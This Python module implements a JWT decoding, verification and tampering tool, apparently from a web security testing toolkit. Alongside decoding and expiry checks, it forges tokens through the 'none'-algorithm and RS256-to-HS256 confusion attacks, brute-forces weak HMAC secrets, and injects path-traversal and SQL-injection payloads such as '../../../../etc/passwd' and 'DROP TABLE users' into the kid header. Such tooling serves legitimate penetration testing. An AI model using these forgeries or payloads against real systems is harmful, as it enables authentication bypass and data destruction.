"""JWT decoding and signing helper."""

from __future__ import annotations

import base64
import json
import hmac
import hashlib
from datetime import datetime, timezone
from typing import Dict, List, Optional

from ..base import ToolResult

try:  # pragma: no cover - optional dependency for RSA verification
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives.serialization import load_pem_private_key, load_pem_public_key
except Exception:  # pragma: no cover - cryptography missing
    hashes = None  # type: ignore[assignment]
    padding = None  # type: ignore[assignment]
    load_pem_private_key = None  # type: ignore[assignment]
    load_pem_public_key = None  # type: ignore[assignment]


_HMAC_ALGS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}

_RSA_HASHES: Dict[str, hashes.HashAlgorithm] = {}
if hashes is not None:  # pragma: no branch - only populates when cryptography available
    _RSA_HASHES = {
        "RS256": hashes.SHA256(),
        "RS384": hashes.SHA384(),
        "RS512": hashes.SHA512(),
    }


class JWTTool:
    name = "JWT Tool"
    description = "Decode, verify, and tamper with JSON Web Tokens."
    category = "Web"

    def run(
        self,
        token: str,
        secret: str = "",
        verify: str = "true",
        public_key: str = "",
        private_key: str = "",
        override_alg: str = "",
        new_header: str = "",
        new_payload: str = "",
        resign: str = "false",
        none_attack: str = "false",
        check_weak_secrets: str = "true",
        algorithm_confusion: str = "false",
        kid_injection: str = "false",
        analyze_expiration: str = "true",
    ) -> ToolResult:
        token = token.strip()
        if not token:
            raise ValueError("Token is required")

        header_b64, payload_b64, signature_b64 = _split_token(token)
        header = self._decode_segment(header_b64)
        payload = self._decode_segment(payload_b64)

        lines = ["Decoded header:", json.dumps(header, indent=2), "", "Decoded payload:", json.dumps(payload, indent=2)]

        # Analyze token expiration
        if analyze_expiration.strip().lower() in {"1", "true", "yes", "on"}:
            exp_analysis = self._analyze_expiration(payload)
            if exp_analysis:
                lines.extend(["", "Token Expiration Analysis:", *exp_analysis])

        chosen_alg = override_alg.strip().upper() or header.get("alg", "")
        verify_flag = verify.strip().lower() in {"1", "true", "yes", "on"}

        # Check for weak secrets
        if check_weak_secrets.strip().lower() in {"1", "true", "yes", "on"}:
            weak_secrets = self._check_weak_secrets(header_b64, payload_b64, signature_b64, chosen_alg)
            if weak_secrets:
                lines.extend(["", "Weak Secret Detection:", *weak_secrets])

        if verify_flag and chosen_alg:
            verification_lines = self._verify_signature(
                alg=chosen_alg,
                secret=secret,
                public_key=public_key,
                signing_input=f"{header_b64}.{payload_b64}".encode(),
                signature=signature_b64,
            )
            lines.extend(["", *verification_lines])

        updated_header = header.copy()
        if new_header.strip():
            try:
                override_header = json.loads(new_header)
                if isinstance(override_header, dict):
                    updated_header.update(override_header)
            except json.JSONDecodeError as exc:
                lines.extend(["", f"Header override invalid JSON: {exc}"])

        updated_payload = payload.copy()
        if new_payload.strip():
            try:
                override_payload = json.loads(new_payload)
                if isinstance(override_payload, dict):
                    updated_payload.update(override_payload)
            except json.JSONDecodeError as exc:
                lines.extend(["", f"Payload override invalid JSON: {exc}"])

        signing_header = updated_header
        signing_payload = updated_payload
        header_segment = _b64url_encode(json.dumps(signing_header, separators=(",", ":")).encode())
        payload_segment = _b64url_encode(json.dumps(signing_payload, separators=(",", ":")).encode())

        if none_attack.strip().lower() in {"1", "true", "yes", "on"}:
            none_header = signing_header.copy()
            none_header["alg"] = "none"
            none_header.pop("kid", None)
            header_none_seg = _b64url_encode(json.dumps(none_header, separators=(",", ":")).encode())
            token_none = f"{header_none_seg}.{payload_segment}"
            lines.extend([
                "",
                "None-alg token (signature stripped):",
                token_none,
            ])

        # Algorithm confusion attack
        if algorithm_confusion.strip().lower() in {"1", "true", "yes", "on"}:
            confusion_attempts = self._attempt_algorithm_confusion(
                header_b64, payload_b64, signature_b64, public_key
            )
            if confusion_attempts:
                lines.extend(["", "Algorithm Confusion Attempts:", *confusion_attempts])

        # Kid injection attack
        if kid_injection.strip().lower() in {"1", "true", "yes", "on"}:
            kid_attempts = self._attempt_kid_injection(header_b64, payload_b64, signature_b64)
            if kid_attempts:
                lines.extend(["", "Kid Injection Attempts:", *kid_attempts])

        if resign.strip().lower() in {"1", "true", "yes", "on"}:
            alg = signing_header.get("alg", chosen_alg)
            if override_alg:
                alg = chosen_alg
            new_token_line = self._resign_token(
                alg=alg,
                secret=secret,
                private_key_pem=private_key,
                header_segment=header_segment,
                payload_segment=payload_segment,
            )
            lines.extend(["", *new_token_line])

        return ToolResult(title="JWT analysis", body="\n".join(lines))

    def _decode_segment(self, segment: str) -> Dict[str, object]:
        data = _b64url_decode(segment)
        try:
            return json.loads(data.decode()) if data else {}
        except json.JSONDecodeError:
            return {"raw": data.decode(errors="replace")}

    def _verify_signature(
        self,
        alg: str,
        secret: str,
        public_key: str,
        signing_input: bytes,
        signature: str,
    ) -> list[str]:
        if not signature:
            return ["Signature missing from token"]
        if alg in _HMAC_ALGS:
            if not secret:
                return [f"HS verification skipped (provide a secret to verify {alg})."]
            digest = hmac.new(secret.encode(), signing_input, _HMAC_ALGS[alg]).digest()
            expected = _b64url_encode(digest)
            status = "valid" if _constant_time_equals(expected, signature) else "INVALID"
            return [f"HMAC verification ({alg}) result: {status}"]
        if alg in _RSA_HASHES and hashes is not None and padding is not None and load_pem_public_key is not None:
            if not public_key.strip():
                return [f"RSA verification skipped (provide a public key for {alg})."]
            try:
                pub = load_pem_public_key(public_key.encode())
                pub.verify(
                    _b64url_decode(signature),
                    signing_input,
                    padding.PKCS1v15(),
                    _RSA_HASHES[alg],
                )
                return [f"RSA verification ({alg}) result: valid"]
            except Exception as exc:  # pragma: no cover
                return [f"RSA verification ({alg}) failed: {exc}"]
        return [f"Algorithm {alg} not supported for verification."]

    def _resign_token(
        self,
        alg: str,
        secret: str,
        private_key_pem: str,
        header_segment: str,
        payload_segment: str,
    ) -> list[str]:
        signing_input = f"{header_segment}.{payload_segment}".encode()
        if alg in _HMAC_ALGS:
            if not secret:
                return [f"Cannot re-sign using {alg}: provide a secret key."]
            digest = hmac.new(secret.encode(), signing_input, _HMAC_ALGS[alg]).digest()
            signature = _b64url_encode(digest)
            return ["Re-signed token:", f"{header_segment}.{payload_segment}.{signature}"]
        if alg in _RSA_HASHES and hashes is not None and padding is not None and load_pem_private_key is not None:
            if not private_key_pem.strip():
                return [f"Cannot re-sign using {alg}: provide a PEM private key."]
            try:
                private_key = load_pem_private_key(private_key_pem.encode(), password=None)
                signature = private_key.sign(signing_input, padding.PKCS1v15(), _RSA_HASHES[alg])
            except Exception as exc:  # pragma: no cover
                return [f"Failed to sign token: {exc}"]
            signature_segment = _b64url_encode(signature)
            return ["Re-signed token:", f"{header_segment}.{payload_segment}.{signature_segment}"]
        return [f"Algorithm {alg} not supported for signing."]

    def _check_weak_secrets(
        self, header_b64: str, payload_b64: str, signature_b64: str, alg: str
    ) -> List[str]:
        """Check for common weak secrets."""
        if alg not in _HMAC_ALGS:
            return []
        
        signing_input = f"{header_b64}.{payload_b64}".encode()
        weak_secrets = [
            "", "secret", "Secret", "SECRET",
            "password", "Password", "PASSWORD",
            "123456", "admin", "Admin", "ADMIN",
            "key", "Key", "KEY", "test", "Test",
            "jwt", "JWT", "token", "Token",
            "changeme", "default", "None", "none",
        ]
        
        results: List[str] = []
        for weak_secret in weak_secrets:
            try:
                digest = hmac.new(weak_secret.encode(), signing_input, _HMAC_ALGS[alg]).digest()
                expected = _b64url_encode(digest)
                if _constant_time_equals(expected, signature_b64):
                    results.append(f"✓ Weak secret found: {repr(weak_secret)}")
                    break
            except Exception:
                continue
        
        if not results:
            results.append("No common weak secrets matched.")
        
        return results

    def _attempt_algorithm_confusion(
        self, header_b64: str, payload_b64: str, signature_b64: str, public_key: str
    ) -> List[str]:
        """Attempt algorithm confusion attack (RS256 -> HS256)."""
        results: List[str] = []
        
        if not public_key.strip():
            return ["Algorithm confusion skipped: no public key provided"]
        
        # Try converting RS256 to HS256 using public key as secret
        try:
            signing_input = f"{header_b64}.{payload_b64}".encode()
            
            # Create HS256 header
            header = self._decode_segment(header_b64)
            hs256_header = header.copy()
            hs256_header["alg"] = "HS256"
            hs256_header_b64 = _b64url_encode(json.dumps(hs256_header, separators=(",", ":")).encode())
            
            # Sign with public key as secret (algorithm confusion)
            pub_key_bytes = public_key.encode()
            digest = hmac.new(pub_key_bytes, signing_input, _HMAC_ALGS["HS256"]).digest()
            new_signature = _b64url_encode(digest)
            
            confused_token = f"{hs256_header_b64}.{payload_b64}.{new_signature}"
            results.append("Algorithm confusion token (RS256 -> HS256):")
            results.append(confused_token)
        except Exception as exc:
            results.append(f"Algorithm confusion attempt failed: {exc}")
        
        return results

    def _attempt_kid_injection(
        self, header_b64: str, payload_b64: str, signature_b64: str
    ) -> List[str]:
        """Attempt kid (Key ID) injection attacks."""
        results: List[str] = []
        
        header = self._decode_segment(header_b64)
        signing_input = f"{header_b64}.{payload_b64}".encode()
        
        # Kid path traversal attempts
        kid_injections = [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
        ]
        
        for kid_value in kid_injections:
            try:
                # Create header with injected kid
                new_header = header.copy()
                new_header["kid"] = kid_value
                new_header_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
                
                # Note: This is just showing the tampered header
                # Actual signature would need to be recalculated
                tampered_token = f"{new_header_b64}.{payload_b64}.{signature_b64}"
                results.append(f"Kid injection attempt: {kid_value}")
                results.append(tampered_token)
            except Exception:
                continue
        
        # SQL injection in kid
        sql_kid_values = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
        ]
        
        for sql_kid in sql_kid_values:
            try:
                new_header = header.copy()
                new_header["kid"] = sql_kid
                new_header_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
                tampered_token = f"{new_header_b64}.{payload_b64}.{signature_b64}"
                results.append(f"Kid SQL injection attempt: {sql_kid}")
                results.append(tampered_token)
            except Exception:
                continue
        
        if not results:
            results.append("No kid injection vulnerabilities detected in header.")
        
        return results

    def _analyze_expiration(self, payload: Dict[str, object]) -> List[str]:
        """Analyze token expiration claims."""
        results: List[str] = []
        
        now = datetime.now(timezone.utc)
        now_timestamp = int(now.timestamp())
        
        # Check exp (expiration time)
        exp = payload.get("exp")
        if exp:
            try:
                exp_int = int(exp) if isinstance(exp, (int, float, str)) else None
                if exp_int:
                    exp_dt = datetime.fromtimestamp(exp_int, tz=timezone.utc)
                    if exp_int < now_timestamp:
                        results.append(f"⚠ Token EXPIRED at {exp_dt.isoformat()}")
                    else:
                        remaining = exp_int - now_timestamp
                        results.append(f"✓ Token expires at {exp_dt.isoformat()} ({remaining}s remaining)")
            except (ValueError, TypeError, OSError):
                results.append(f"Invalid exp claim: {exp}")
        
        # Check nbf (not before)
        nbf = payload.get("nbf")
        if nbf:
            try:
                nbf_int = int(nbf) if isinstance(nbf, (int, float, str)) else None
                if nbf_int:
                    nbf_dt = datetime.fromtimestamp(nbf_int, tz=timezone.utc)
                    if nbf_int > now_timestamp:
                        results.append(f"⚠ Token not valid before {nbf_dt.isoformat()}")
                    else:
                        results.append(f"✓ Token valid from {nbf_dt.isoformat()}")
            except (ValueError, TypeError, OSError):
                results.append(f"Invalid nbf claim: {nbf}")
        
        # Check iat (issued at)
        iat = payload.get("iat")
        if iat:
            try:
                iat_int = int(iat) if isinstance(iat, (int, float, str)) else None
                if iat_int:
                    iat_dt = datetime.fromtimestamp(iat_int, tz=timezone.utc)
                    results.append(f"Token issued at {iat_dt.isoformat()}")
            except (ValueError, TypeError, OSError):
                results.append(f"Invalid iat claim: {iat}")
        
        if not results:
            results.append("No expiration claims (exp, nbf, iat) found in token.")
        
        return results


def _split_token(token: str) -> tuple[str, str, str]:
    parts = token.split(".")
    if len(parts) == 2:
        header, payload = parts
        return header, payload, ""
    if len(parts) == 3:
        return parts[0], parts[1], parts[2]
    raise ValueError("Invalid JWT structure")


def _b64url_decode(data: str) -> bytes:
    padding_len = (-len(data)) % 4
    data_padded = data + ("=" * padding_len)
    return base64.urlsafe_b64decode(data_padded.encode())


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _constant_time_equals(a: str, b: str) -> bool:
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a.encode(), b.encode()):
        result |= x ^ y
    return result == 0
